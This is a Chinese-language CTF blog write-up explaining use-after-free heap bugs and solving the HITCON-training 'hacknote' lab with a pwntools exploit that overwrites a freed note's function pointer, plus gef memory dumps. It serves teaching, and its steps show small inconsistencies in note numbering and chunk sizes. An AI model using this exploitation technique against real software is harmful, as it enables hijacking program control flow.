
title: Use After Free

date: 2018-03-31 16:47:28

categories:
- CTF
- Use-After-Free



## 原理

**根本原因：**

> 应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。

Use After Free 就是其字面所表达的意思，<u>**当一个内存块被释放之后再次被使用**</u>。但是其实这里有以下几种情况

- 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。
- 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么**程序很有可能可以正常运转**。
- 内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，**就很有可能会出现奇怪的问题**。

而我们一般所指的 **Use After Free** 漏洞主要是后两种。此外，**我们一般称被释放后没有被设置为NULL的内存指针为dangling pointer。**

简单的例子:

```c
#include <stdio.h>
#include <stdlib.h>
typedef struct name {
  char *myname;
  void (*func)(char *str);
} NAME;
void myprint(char *str) { printf("%s\n", str); }
void printmyname() { printf("call print my name\n"); }
int main() {
  NAME *a;
  a = (NAME *)malloc(sizeof(struct name));
  a->func = myprint;
  a->myname = "I can also use it";
  a->func("this is my function");
  // free without modify
  free(a);
  a->func("I can also use it");
  // free with modify
  a->func = printmyname;
  a->func("this is my function");
  // set NULL
  a = NULL;
  printf("this pogram will crash...\n");
  a->func("can not be printed...");
}
```

运行结果：  **指针被free后依然可以使用。**

```C
➜  use_after_free git:(use_after_free) ✗ ./use_after_free                      
this is my function
I can also use it
call print my name
this pogram will crash...
[1]    38738 segmentation fault (core dumped)  ./use_after_free
```



## 程序分析

1. add_note

最多可以添加5个note。每个note有两个字段put与content，其中put会被设置为一个函数，其函数会输出 content 具体的内容。就指针保护被覆盖  可以重用。

2. print_note

根据给定的note的索引来输出对应索引的note的内容

3. delete_note

根据给定的索引来释放对应的note。

在删除的时候，只是单纯进行了free，而没有设置为NULL，存在Use After Free。



程序中有magic() 函数， 可以 get flag。



## 利用思路

[HITCON-training 中的 lab 10 hacknote为例](use-after-free/use_after_free.zip)。

**修改note的put字段为magic函数的地址，从而实现在执行print note 的时候执行magic函数**

```
   +-----------------+                       
   |   put           |                       
   +-----------------+                       
   |   content       |       size              
   +-----------------+------------------->+----------------+
                                          |     real       |
                                          |    content     |
                                          |                |
                                          +----------------+
```

- 申请note0，real content size为16（大小与note大小所在的bin不一样即可）
- 申请note1，real content size为16（大小与note大小所在的bin不一样即可）
- 释放note0
- 释放note1
- 此时，大小为16的fast bin chunk中链表为note1->note0   (fastbin[0] 保存16字节的chunk)
- 申请note2，并且设置real content的大小为8，那么根据堆的分配规则
- note2其实会分配note1对应的内存块。
- real content 对应的chunk其实是note0。
- 如果我们这时候向note3的chunk部分写入magic的地址，那么由于我们没有note1为NULL。当我们再次尝试输出note1的时候，程序就会调用magic函数。



```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
r = process('./hacknote')
def addnote(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)
def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
#gdb.attach(r)
magic = 0x08048986
addnote(32, "aaaa") # add note 0
addnote(32, "ddaa") # add note 1
delnote(0) # delete note 0
delnote(1) # delete note 1
addnote(8, p32(magic)) # add note 2
printnote(0) # print note 0
r.interactive()
```



## 内存状态



```

notelist:
gef➤  x/10x 0x804A070 
0x804a070 <notelist>:	     0x08f25008	0x08f25040	0x00000000  0x00000000
0x804a080 <notelist+16>:	0x00000000	0x00000000	0x00000000  0x00000000

Chunk0：
0x08f25008 put
0x08f25018 control
gef➤  x/10x 0x08f25008
0x8f25008:	0x0804865b	0x08f25018	0x00000000	0x00000029
0x8f25018:	0x61616161	0x0000000a	0x00000000	0x00000000
0x8f25028:	0x00000000	0x00000000

Chunk1：
0x08f25040  put
0x08f25050  control
gef➤  x/10x 0x08f25040
0x8f25040:	0x0804865b	0x08f25050	0x00000000	0x00000029
0x8f25050:	0x61616464	0x0000000a	0x00000000	0x00000000
0x8f25060:	0x00000000	0x00000000


free 0 ， free 1
Fastbin[0]  →   UsedChunk(addr=0x932c040,size=0x10)   →   UsedChunk(addr=0x932c008,size=0x10)  
Fastbin[1] 0x00
Fastbin[2] 0x00
Fastbin[3]  →   UsedChunk(addr=0x932c050,size=0x28)   →   UsedChunk(addr=0x932c018,size=0x28)  
Fastbin[4] 0x00


Add 3 ， malloc  put
Fastbin[0]  →   UsedChunk(addr=0x8572008,size=0x10)  
Fastbin[1] 0x00
Fastbin[2] 0x00
Fastbin[3]  →   UsedChunk(addr=0x8572050,size=0x28)   →   UsedChunk(addr=0x8572018,size=0x28)  
Fastbin[4] 0x00

Add 3 ， malloc  control
Fastbin[0] 0x00
Fastbin[1] 0x00
Fastbin[2] 0x00
Fastbin[3]  →   UsedChunk(addr=0x8572050,size=0x28)   →   UsedChunk(addr=0x8572018,size=0x28)  
Fastbin[4] 0x00


notelist:
gef➤   x/10x 0x804A070 
0x804a070 <notelist>:		0x09d4b008	0x09d4b040	0x09d4b040   0x00000000
0x804a080 <notelist+16>:	0x00000000	0x00000000	0x0000000    0x00000000

Chunk3:
0x0804865b: put
0x09d4b008:control
gef➤  x/10x 0x09d4b040
0x9d4b040:	0x0804865b	0x09d4b008	0x00000000	0x00000029
0x9d4b050:	0x09d4b010	0x0000000a	0x00000000	0x00000000
0x9d4b060:	0x00000000	0x00000000

Chunk3->control  即 chunk0 -> put  
写入 magic函数  地址，
这样我们调用 chunk0 -> put    既可以指向 magic 函数

```



## 参考

https://ctf-wiki.github.io/ctf-wiki/pwn/heap/use_after_free/

https://blog.csdn.net/qq_31481187/article/details/73612451